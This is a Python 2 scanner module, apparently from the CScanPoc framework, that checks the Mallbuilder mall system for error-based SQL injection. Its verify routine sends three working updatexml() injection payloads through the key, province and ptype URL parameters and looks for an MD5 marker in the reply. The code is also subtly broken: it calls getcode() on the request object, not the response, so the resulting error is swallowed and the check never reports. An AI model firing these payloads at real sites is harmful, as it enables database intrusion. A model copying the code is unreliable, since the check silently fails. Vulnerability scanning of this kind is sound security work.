# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    poc_id = '211c42ce-3bb0-444e-bebe-44685efd877b'
    name = 'Mallbuilder商城系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-10-27'  # 漏洞公布时间
    desc = '''
        Mallbuilder商城系统 ?m=product&s=list&key=, key参数木有过滤，报错注入。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Mallbuilder商城系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'd4a8d5e6-e7e8-457f-a5aa-922ee1ff1972'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Referer   : http://www.wooyun.org/bugs/wooyun-2014-080751
            payloads=[
                '?m=product&s=list&key=%27%20and%201=updateXml%281,concat%280x5c,md5%283.14%29%29,1%29%23',
                '?m=shop&id=&province=%27%20and%201=updatexml%281,concat%280x5c,md5%283.14%29%29,1%29%23',
                '?m=product&s=list&ptype=0%27%20%20and%201=updatexml%281,concat%280x5c,md5%283.14%29%29,1%29%23'
            ] 
            for payload in payloads:
                verify_url = self.target + payload
                req = urllib2.Request(verify_url)
                content = urllib2.urlopen(req).read()
                
                if req.getcode() == 200 and "4beed3b9c4a886067de0e3a094246f7" in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
